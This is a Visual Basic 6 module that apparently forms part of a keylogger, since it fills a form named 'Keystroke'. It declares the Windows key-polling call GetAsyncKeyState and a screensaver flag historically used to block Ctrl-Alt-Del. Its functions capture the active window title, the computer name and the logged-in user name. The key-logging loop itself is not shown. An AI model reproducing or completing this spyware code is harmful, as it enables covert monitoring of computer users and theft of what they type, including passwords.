Attribute VB_Name = "Module1"
Declare Function WriteFileNO Lib "kernel32.dll" Alias "WriteFile" (ByVal hfile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function CloseHandle Lib "kernel32.dll" (ByVal hObject As Long) As Long
Declare Function SystemParametersInfo Lib "user32.dll" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uiParam As Long, pvParam As Any, ByVal fWinIni As Long) As Long
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetComputerName Lib "kernel32.dll" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetVersionEx Lib "kernel32.dll" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long
Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Const SPI_SCREENSAVERRUNNING = 97

Type OSVERSIONINFO
  dwOSVersionInfoSize As Long
  dwMajorVersion As Long
  dwMinorVersion As Long
  dwBuildNumber As Long
  dwPlatformId As Long
  szCSDVersion As String * 128
End Type

Global texxt As String
Global word As String
Global Wintext As String

Public Function ascc(texxt As String)
word = Replace(texxt, vbNull, "", 1, -1, vbTextCompare)
End Function

Public Function getwindow()
Dim m
Dim n
Dim hforewnd As Long
Dim slength As Long
Dim retval As Long
hforewnd = GetForegroundWindow()
slength = GetWindowTextLength(hforewnd) + 1
Wintext = Space(slength)
retval = GetWindowText(hforewnd, Wintext, slength)
Wintext = Left(Wintext, slength - 1)

End Function


Public Function getnames()
Dim compname As String, retval As Long
compname = Space(255)
retval = GetComputerName(compname, 255)
compname = Left(compname, InStr(compname, vbNullChar) - 1)
Keystroke.Label2.Caption = "Computer Name:           " & compname
Dim username As String
Dim slength As Long
username = Space(255)
slength = 255
retval = GetUserName(username, slength)
username = Left(username, slength - 1)
Keystroke.Label1.Caption = "Logged In As:               " & username
End Function

